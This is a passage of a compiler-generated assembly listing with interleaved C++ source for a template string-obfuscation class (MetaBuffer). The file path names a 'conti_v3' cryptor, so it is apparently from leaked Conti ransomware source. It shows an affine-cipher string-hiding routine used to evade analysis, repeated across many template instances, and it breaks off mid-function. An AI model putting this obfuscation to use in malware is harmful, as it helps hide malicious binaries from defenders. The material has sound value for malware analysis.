; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 63	 mov	 BYTE PTR [rcx+1], 99	; 00000063H
  00007	c6 41 02 07	 mov	 BYTE PTR [rcx+2], 7
  0000b	c6 41 03 72	 mov	 BYTE PTR [rcx+3], 114	; 00000072H
  0000f	c6 41 04 07	 mov	 BYTE PTR [rcx+4], 7
  00013	c6 41 05 50	 mov	 BYTE PTR [rcx+5], 80	; 00000050H
  00017	c6 41 06 07	 mov	 BYTE PTR [rcx+6], 7
  0001b	c6 41 07 60	 mov	 BYTE PTR [rcx+7], 96	; 00000060H
  0001f	c6 41 08 07	 mov	 BYTE PTR [rcx+8], 7
  00023	c6 41 09 07	 mov	 BYTE PTR [rcx+9], 7
  00027	c6 41 0a 07	 mov	 BYTE PTR [rcx+10], 7
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,7,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 36 00 00 00	 mov	 eax, 54			; 00000036H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 00	 mov	 BYTE PTR [rcx+1], 0
  00007	c6 41 02 36	 mov	 BYTE PTR [rcx+2], 54	; 00000036H
  0000b	c6 41 03 05	 mov	 BYTE PTR [rcx+3], 5
  0000f	c6 41 04 36	 mov	 BYTE PTR [rcx+4], 54	; 00000036H
  00013	c6 41 05 24	 mov	 BYTE PTR [rcx+5], 36	; 00000024H
  00017	c6 41 06 36	 mov	 BYTE PTR [rcx+6], 54	; 00000036H
  0001b	c6 41 07 4d	 mov	 BYTE PTR [rcx+7], 77	; 0000004dH
  0001f	c6 41 08 36	 mov	 BYTE PTR [rcx+8], 54	; 00000036H
  00023	c6 41 09 36	 mov	 BYTE PTR [rcx+9], 54	; 00000036H
  00027	c6 41 0a 36	 mov	 BYTE PTR [rcx+10], 54	; 00000036H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0DG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,54,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 03	 sub	 ecx, 3

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 14	 mov	 BYTE PTR [rcx+1], 20
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 4f	 mov	 BYTE PTR [rcx+3], 79	; 0000004fH
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 0c	 mov	 BYTE PTR [rcx+5], 12
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 23	 mov	 BYTE PTR [rcx+7], 35	; 00000023H
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GB@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<97,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 40	 sub	 ecx, 64			; 00000040H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 21	 mov	 BYTE PTR [rcx+1], 33	; 00000021H
  00007	c6 41 02 40	 mov	 BYTE PTR [rcx+2], 64	; 00000040H
  0000b	c6 41 03 1e	 mov	 BYTE PTR [rcx+3], 30
  0000f	c6 41 04 40	 mov	 BYTE PTR [rcx+4], 64	; 00000040H
  00013	c6 41 05 46	 mov	 BYTE PTR [rcx+5], 70	; 00000046H
  00017	c6 41 06 40	 mov	 BYTE PTR [rcx+6], 64	; 00000040H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 40	 mov	 BYTE PTR [rcx+8], 64	; 00000040H
  00023	c6 41 09 40	 mov	 BYTE PTR [rcx+9], 64	; 00000040H
  00027	c6 41 0a 40	 mov	 BYTE PTR [rcx+10], 64	; 00000040H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 45	 sub	 ecx, 69			; 00000045H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 03	 mov	 BYTE PTR [rcx+1], 3
  00007	c6 41 02 45	 mov	 BYTE PTR [rcx+2], 69	; 00000045H
  0000b	c6 41 03 0d	 mov	 BYTE PTR [rcx+3], 13
  0000f	c6 41 04 45	 mov	 BYTE PTR [rcx+4], 69	; 00000045H
  00013	c6 41 05 55	 mov	 BYTE PTR [rcx+5], 85	; 00000055H
  00017	c6 41 06 45	 mov	 BYTE PTR [rcx+6], 69	; 00000045H
  0001b	c6 41 07 1f	 mov	 BYTE PTR [rcx+7], 31
  0001f	c6 41 08 45	 mov	 BYTE PTR [rcx+8], 69	; 00000045H
  00023	c6 41 09 45	 mov	 BYTE PTR [rcx+9], 69	; 00000045H
  00027	c6 41 0a 45	 mov	 BYTE PTR [rcx+10], 69	; 00000045H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0EF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,69,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 66 00 00 00	 mov	 eax, 102		; 00000066H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
